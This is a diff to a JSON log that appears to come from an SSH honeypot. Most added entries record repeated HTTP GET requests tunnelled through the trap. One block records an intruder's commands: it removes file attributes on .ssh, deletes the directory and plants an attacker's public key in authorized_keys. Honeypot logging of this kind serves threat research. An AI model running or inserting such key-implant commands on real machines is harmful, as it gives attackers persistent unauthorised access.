@@ -965,6 +965,48 @@
             "event": "direct_tcpip_data",
             "details": "TCP/IP Data: b'GET / HTTP/1.1\\r\\nUser-Agent: Opera/9.80 (Windows NT 6.1; WOW64) Presto/2.12.388 Version/12.18\\r\\n\\r\\n'",
             "session": "8cbbb172e472"
+        },
+        {
+            "timestamp": "2023-11-10T11:05:24.982014Z",
+            "event": "direct_tcpip_data",
+            "details": "TCP/IP Data: b'GET / HTTP/1.1\\r\\nUser-Agent: Opera/9.80 (Windows NT 6.1; WOW64) Presto/2.12.388 Version/12.18\\r\\n\\r\\n'",
+            "session": "6a28ed261610"
+        },
+        {
+            "timestamp": "2023-11-10T11:05:34.316375Z",
+            "event": "direct_tcpip_data",
+            "details": "TCP/IP Data: b'GET / HTTP/1.1\\r\\nUser-Agent: Opera/9.80 (Windows NT 6.1; WOW64) Presto/2.12.388 Version/12.18\\r\\n\\r\\n'",
+            "session": "9b65b5c9b962"
+        },
+        {
+            "timestamp": "2023-11-10T11:05:36.961620Z",
+            "event": "direct_tcpip_data",
+            "details": "TCP/IP Data: b'GET / HTTP/1.1\\r\\nUser-Agent: Opera/9.80 (Windows NT 6.1; WOW64) Presto/2.12.388 Version/12.18\\r\\n\\r\\n'",
+            "session": "938a2268abca"
+        },
+        {
+            "timestamp": "2023-11-10T11:05:43.014593Z",
+            "event": "direct_tcpip_data",
+            "details": "TCP/IP Data: b'GET / HTTP/1.1\\r\\nUser-Agent: Opera/9.80 (Windows NT 6.1; WOW64) Presto/2.12.388 Version/12.18\\r\\n\\r\\n'",
+            "session": "d014e16fd613"
+        },
+        {
+            "timestamp": "2023-11-10T11:05:45.849964Z",
+            "event": "direct_tcpip_data",
+            "details": "TCP/IP Data: b'GET / HTTP/1.1\\r\\nUser-Agent: Opera/9.80 (Windows NT 6.1; WOW64) Presto/2.12.388 Version/12.18\\r\\n\\r\\n'",
+            "session": "42ffd4fdfd48"
+        },
+        {
+            "timestamp": "2023-11-10T11:05:52.083778Z",
+            "event": "direct_tcpip_data",
+            "details": "TCP/IP Data: b'GET / HTTP/1.1\\r\\nUser-Agent: Opera/9.80 (Windows NT 6.1; WOW64) Presto/2.12.388 Version/12.18\\r\\n\\r\\n'",
+            "session": "eb21e66ca464"
+        },
+        {
+            "timestamp": "2023-11-10T11:05:59.189974Z",
+            "event": "direct_tcpip_data",
+            "details": "TCP/IP Data: b'GET / HTTP/1.1\\r\\nUser-Agent: Opera/9.80 (Windows NT 6.1; WOW64) Presto/2.12.388 Version/12.18\\r\\n\\r\\n'",
+            "session": "21799d677a4a"
         }
     ],
     "177.30.73.53": [
@@ -1835,6 +1877,26 @@
             "event": "file_download",
             "details": "File downloaded: /root/.ssh/authorized_keys (SHA-256: a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2)",
             "session": "923790e54586"
+        }
+    ],
+    "85.172.189.189": [
+        {
+            "timestamp": "2023-11-10T10:27:48.393189Z",
+            "event": "command_input",
+            "input": "cd ~; chattr -ia .ssh; lockr -ia .ssh",
+            "session": "8905aa2131ed"
+        },
+        {
+            "timestamp": "2023-11-10T10:27:49.140972Z",
+            "event": "command_input",
+            "input": "cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr\">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",
+            "session": "8905aa2131ed"
+        },
+        {
+            "timestamp": "2023-11-10T10:27:49.361901Z",
+            "event": "file_download",
+            "details": "File downloaded: /root/.ssh/authorized_keys (SHA-256: a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2)",
+            "session": "8905aa2131ed"
         }
     ],
     "159.65.146.149": [
